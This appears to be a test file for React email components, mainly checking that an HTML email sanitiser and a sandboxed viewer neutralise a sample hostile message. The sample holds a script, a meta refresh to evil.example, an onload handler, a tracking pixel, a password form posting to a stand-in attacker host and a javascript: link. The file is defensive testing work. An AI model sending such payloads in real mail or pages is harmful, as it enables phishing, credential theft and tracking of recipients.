import { act, fireEvent, render, screen, waitFor, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { I18nProvider } from '@robin-dot-lab/react';
import { useState } from 'react';
import { describe, expect, it, vi } from 'vitest';
import { AddressCard, AttachmentChip, AttachmentList, EmailViewer, MessageHeader, MessageList, MessageListItem, type MessageSummary } from './index.js';
import { emailCsp, emailDocument, hasRemoteImages } from './lib/email-html.js';

const NOW = Date.now();
const MESSAGES: MessageSummary[] = [
  { id: 'a', from: { name: 'Pixel Party', address: 'hello@pixelparty.example' }, subject: 'Your ticket', preview: 'Hi! Your ticket is attached.', date: NOW - 2 * 60_000, unread: true, hasAttachments: true },
  { id: 'b', from: { address: 'noreply@shop.example' }, subject: 'Order shipped', preview: 'On its way.', date: NOW - 3600_000 },
  { id: 'c', from: { name: 'Ada', address: 'ada@example.org' }, subject: '', date: NOW - 86_400_000 },
];

function Inbox(props: { shortcuts?: boolean }) {
  const [id, setId] = useState<string | null>('a');
  return <><input aria-label="Search" /><MessageList messages={MESSAGES} selectedId={id} onSelectionChange={setId} {...props} /><output>{id}</output></>;
}

describe('MessageList', () => {
  it('a named listbox of options; unread and attachments said in words; selection is aria-selected', async () => {
    render(<Inbox />);
    const list = screen.getByRole('listbox', { name: 'Messages' });
    const options = within(list).getAllByRole('option');
    expect(options).toHaveLength(3);
    expect(options[0]!.className).toContain('nl-message--unread');
    expect(options[0]!.textContent).toContain('Unread');
    expect(within(options[0]!).getByRole('img', { name: 'Has attachments' })).toBeTruthy();
    expect(options[0]!.textContent).toContain('2 minutes ago');
    expect(options[0]!.getAttribute('aria-selected')).toBe('true');
    expect(options[1]!.textContent).not.toContain('Unread');
    expect(options[2]!.textContent).toContain('(no subject)');
    await userEvent.click(options[1]!);
    expect(document.querySelector('output')!.textContent).toBe('b');
  });
  it('arrow keys move inside the list; j / k work from the page but not while typing in a field', async () => {
    render(<Inbox shortcuts />);
    await userEvent.keyboard('j');
    expect(document.querySelector('output')!.textContent).toBe('b');
    await userEvent.keyboard('j');
    expect(document.querySelector('output')!.textContent).toBe('c');
    await userEvent.keyboard('k');
    expect(document.querySelector('output')!.textContent).toBe('b');
    await userEvent.click(screen.getByRole('textbox', { name: 'Search' }));
    await userEvent.keyboard('jk');
    expect(document.querySelector('output')!.textContent).toBe('b');
    await userEvent.keyboard('{Control>}j{/Control}');
    expect(document.querySelector('output')!.textContent).toBe('b');
  });
  it('loading: skeletons and a polite status, busy; empty: an EmptyState; French words', () => {
    const { rerender, container } = render(<MessageList messages={[]} loading />);
    expect(screen.getByRole('status').textContent).toBe('Loading messages');
    expect(container.firstElementChild!.getAttribute('aria-busy')).toBe('true');
    rerender(<I18nProvider locale="fr-FR"><MessageList messages={[]} /></I18nProvider>);
    expect(screen.getByRole('heading', { name: 'Aucun message pour l’instant' })).toBeTruthy();
    expect(screen.getByRole('listbox', { name: 'Messages' })).toBeTruthy();
  });
  it('MessageListItem can be rendered by hand, through the children function', () => {
    render(<MessageList messages={MESSAGES.slice(1, 2)}>{(m) => <MessageListItem message={{ ...m, subject: `Re: ${m.subject}` }} />}</MessageList>);
    const option = screen.getByRole('option');
    expect(option.textContent).toContain('noreply@shop.example');
    expect(option.textContent).toContain('Re: Order shipped');
  });
});

describe('MessageHeader', () => {
  it('subject heading, From / To / Date list, delete and view-source actions', async () => {
    const onDelete = vi.fn(), onViewSource = vi.fn();
    render(<MessageHeader subject="Your ticket" from={{ name: 'Pixel Party', address: 'hello@pixelparty.example' }} to={[{ address: 'pixel-otter@nerdlab.sh' }]} date={NOW - 60_000} onDelete={onDelete} onViewSource={onViewSource} />);
    expect(screen.getByRole('heading', { level: 2, name: 'Your ticket' })).toBeTruthy();
    const terms = screen.getAllByRole('term').map((d) => d.textContent);
    expect(terms).toEqual(['From', 'To', 'Date']);
    expect(screen.getAllByRole('definition')[0]!.textContent).toBe('Pixel Party <hello@pixelparty.example>');
    await userEvent.click(screen.getByRole('button', { name: 'Delete' }));
    await userEvent.click(screen.getByRole('button', { name: 'View source' }));
    expect(onDelete).toHaveBeenCalled();
    expect(onViewSource).toHaveBeenCalled();
  });
});

const NASTY = `<html><head><meta http-equiv="refresh" content="0;url=https://evil.example"><script>alert(1)</script></head>
<body onload="steal()"><p>Hello</p><img src="https://tracker.example/pixel.gif"><img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=">
<form action="https://evil.example/login"><input name="password"><button formaction="https://evil.example">Log in</button></form>
<a href="https://nerdlab.sh">Site</a> <a href="javascript:alert(2)">Bad</a></body></html>`;

describe('emailDocument', () => {
  const parse = (s: string) => new DOMParser().parseFromString(s, 'text/html');
  it('injects the CSP, blocks remote images, drops scripts, refresh, handlers and javascript: links, disarms forms', () => {
    const doc = parse(emailDocument(NASTY));
    const csp = doc.querySelector('meta[http-equiv="Content-Security-Policy"]')!.getAttribute('content');
    expect(csp).toBe("default-src 'none'; style-src 'unsafe-inline'; img-src data: cid:");
    expect(csp).not.toContain('https:');
    expect(doc.querySelector('script')).toBeNull();
    expect(doc.querySelector('meta[http-equiv="refresh"]')).toBeNull();
    expect(doc.body.hasAttribute('onload')).toBe(false);
    expect(doc.querySelector('form')).toBeNull();
    expect(doc.querySelector('[action], [formaction]')).toBeNull();
    expect(doc.querySelectorAll('a')[1]!.hasAttribute('href')).toBe(false);
    const site = doc.querySelector('a[href="https://nerdlab.sh"]')!;
    expect(site.getAttribute('target')).toBe('_blank');
    expect(site.getAttribute('rel')).toBe('noopener noreferrer');
    expect(doc.querySelector('base')!.getAttribute('target')).toBe('_blank');
    expect(doc.querySelector('meta[name="referrer"]')!.getAttribute('content')).toBe('no-referrer');
    // Remote images are not even requested; embedded ones stay.
    const [remote, embedded] = [...doc.querySelectorAll('img')];
    expect(remote!.hasAttribute('src')).toBe(false);
    expect(remote!.getAttribute('data-blocked-src')).toBe('https://tracker.example/pixel.gif');
    expect(embedded!.getAttribute('src')).toMatch(/^data:image\/gif/);
    expect(parse(emailDocument(NASTY, { remoteImages: true })).querySelector('img')!.getAttribute('src')).toBe('https://tracker.example/pixel.gif');
  });
  it('allows https images only on request', () => {
    expect(emailCsp(true)).toBe("default-src 'none'; style-src 'unsafe-inline'; img-src data: cid: https:");
    expect(hasRemoteImages(NASTY)).toBe(true);
    expect(hasRemoteImages('<img src="data:image/png;base64,AA==">')).toBe(false);
    expect(hasRemoteImages('<td background="//cdn.example/bg.png">')).toBe(true);
    expect(hasRemoteImages('<div style="background:url(https://x.example/a.png)">')).toBe(true);
  });
});

describe('EmailViewer', () => {
  it('a sandboxed iframe without scripts, same origin or forms; images on request; text and source tabs', async () => {
    render(<EmailViewer html={NASTY} text="Hello" source={'Subject: Hi\n\n<p>Hello</p>'} />);
    const frame = await screen.findByTitle('Email content') as HTMLIFrameElement;
    expect(frame.getAttribute('sandbox')).toBe('allow-popups allow-popups-to-escape-sandbox');
    expect(frame.getAttribute('referrerpolicy')).toBe('no-referrer');
    expect(frame.getAttribute('srcdoc')).toContain("img-src data: cid:\"");
    expect(frame.getAttribute('srcdoc')).not.toContain('<script');
    await userEvent.click(screen.getByRole('button', { name: 'Show images' }));
    await waitFor(() => expect(frame.getAttribute('srcdoc')).toContain('img-src data: cid: https:'));
    expect(screen.queryByRole('button', { name: 'Show images' })).toBeNull();
    await userEvent.click(screen.getByRole('tab', { name: 'Text' }));
    expect(screen.getByRole('tabpanel').textContent).toBe('Hello');
    await userEvent.click(screen.getByRole('tab', { name: 'Source' }));
    expect(screen.getByRole('region', { name: 'Source' }).textContent).toContain('Subject: Hi');
  });
  it('no images prompt when nothing is remote; text first when there is no HTML; French', () => {
    const { rerender } = render(<EmailViewer html="<p>Plain</p>" />);
    expect(screen.queryByRole('button', { name: 'Show images' })).toBeNull();
    rerender(<I18nProvider locale="fr-FR"><EmailViewer text="Bonjour" /></I18nProvider>);
    expect(screen.getByRole('tab', { name: 'Texte' }).getAttribute('aria-selected')).toBe('true');
    expect(screen.getByRole('tabpanel').textContent).toBe('Bonjour');
  });
});

describe('Attachments', () => {
  const pdf = { name: 'ticket.pdf', size: 12_400, type: 'application/pdf', href: '/a/1' };
  it('a download link named by the file, size in the locale, icon by type', () => {
    const { rerender } = render(<AttachmentChip attachment={pdf} />);
    const link = screen.getByRole('link', { name: 'ticket.pdf, 12.4 kB, download' });
    expect(link.getAttribute('download')).toBe('ticket.pdf');
    expect(link.getAttribute('href')).toBe('/a/1');
    rerender(<I18nProvider locale="fr-FR"><AttachmentChip attachment={{ ...pdf, size: 3_100_000 }} /></I18nProvider>);
    expect(screen.getByRole('link').getAttribute('aria-label')).toMatch(/^ticket\.pdf, 3,1\sMo, télécharger$/);
  });
  it('a named list, nothing when empty', () => {
    const { rerender, container } = render(<AttachmentList attachments={[pdf, { name: 'photo.jpg', size: 900, type: 'image/jpeg', href: '/a/2' }]} />);
    expect(within(screen.getByRole('list', { name: 'Attachments' })).getAllByRole('link')).toHaveLength(2);
    expect(screen.getByText('900 byte')).toBeTruthy();
    rerender(<AttachmentList attachments={[]} />);
    expect(container.innerHTML).toBe('');
  });
});

describe('AddressCard', () => {
  it('address to copy, unread count in words, state and time left, and a named menu of actions', async () => {
    vi.useFakeTimers({ now: NOW, shouldAdvanceTime: true });
    const onAction = vi.fn();
    render(<AddressCard address="pixel-otter@nerdlab.sh" unread={3} expiresAt={NOW + 6 * 60_000} createdAt={NOW - 54 * 60_000} onAction={onAction} />);
    expect((screen.getByRole('textbox', { name: 'Address' }) as HTMLInputElement).value).toBe('pixel-otter@nerdlab.sh');
    expect(screen.getByText('3 unread messages')).toBeTruthy();
    expect(screen.getByText('Receiving mail')).toBeTruthy();
    expect(screen.getByRole('meter')).toBeTruthy();
    await userEvent.click(screen.getByRole('button', { name: 'Actions for pixel-otter@nerdlab.sh' }));
    await userEvent.click(await screen.findByRole('menuitem', { name: 'Extend' }));
    expect(onAction).toHaveBeenCalledWith('extend');
    await act(() => vi.advanceTimersByTimeAsync(7 * 60_000));
    expect(screen.getByText('Expired', { selector: '.nl-status__label' })).toBeTruthy();
    vi.useRealTimers();
  });
  it('no counter at zero; French', () => {
    render(<I18nProvider locale="fr-FR"><AddressCard address="a@nerdlab.sh" expiresAt={Date.now() + 3600_000} /></I18nProvider>);
    expect(screen.queryByText(/non lu/)).toBeNull();
    expect(screen.getByRole('button', { name: 'Copier l’adresse' })).toBeTruthy();
    fireEvent.keyDown(document.body, { key: 'Escape' });
  });
});

describe('EmailViewer offers only the parts the message has (K11)', () => {
  it('a text-only mail has no HTML tab', () => {
    render(<EmailViewer text={'Line 1\nLine 2'} />);
    expect(screen.getAllByRole('tab').map((t) => t.textContent)).toEqual(['Text']);
    expect(screen.getByText(/Line 1/)).toBeTruthy();
  });
  it('an HTML-only mail has no text tab; the source adds its own', () => {
    render(<EmailViewer html="<p>Hi</p>" source="raw" />);
    expect(screen.getAllByRole('tab').map((t) => t.textContent)).toEqual(['HTML', 'Source']);
  });
});

describe('images the server already blocked (K18)', () => {
  const blocked = '<p>Hi</p><img data-blocked-src="https://example.org/a.png" data-blocked-srcset="https://example.org/a2.png 2x" alt="A">';
  it('emailDocument gives parked URLs back once images are allowed, and keeps them parked otherwise', () => {
    expect(hasRemoteImages(blocked)).toBe(true);
    const off = new DOMParser().parseFromString(emailDocument(blocked), 'text/html').querySelector('img')!;
    expect(off.hasAttribute('src')).toBe(false);
    const on = new DOMParser().parseFromString(emailDocument(blocked, { remoteImages: true }), 'text/html').querySelector('img')!;
    expect(on.getAttribute('src')).toBe('https://example.org/a.png');
    expect(on.getAttribute('srcset')).toBe('https://example.org/a2.png 2x');
    expect(on.hasAttribute('data-blocked-src')).toBe(false);
  });
  it('uncontrolled: “Show images” renders the restored URLs with https: allowed', async () => {
    render(<EmailViewer html={blocked} />);
    await userEvent.click(await screen.findByRole('button', { name: 'Show images' }));
    await waitFor(() => expect(document.querySelector('iframe')!.getAttribute('srcdoc')).toContain('src="https://example.org/a.png"'));
    expect(document.querySelector('iframe')!.getAttribute('srcdoc')).toContain('img-src data: cid: https:');
  });
  it('controlled: the click only asks the app, which passes new HTML and remoteImages', async () => {
    const onChange = vi.fn();
    const { rerender } = render(<EmailViewer html={blocked} remoteImages={false} onRemoteImagesChange={onChange} />);
    await userEvent.click(await screen.findByRole('button', { name: 'Show images' }));
    expect(onChange).toHaveBeenCalledWith(true);
    expect(screen.getByRole('button', { name: 'Show images' })).toBeTruthy(); // still blocked until the app says so
    rerender(<EmailViewer html={'<p>Hi</p><img src="https://example.org/a.png" alt="A">'} remoteImages onRemoteImagesChange={onChange} />);
    await waitFor(() => expect(document.querySelector('iframe')!.getAttribute('srcdoc')).toContain('src="https://example.org/a.png"'));
    expect(screen.queryByRole('button', { name: 'Show images' })).toBeNull();
  });
});
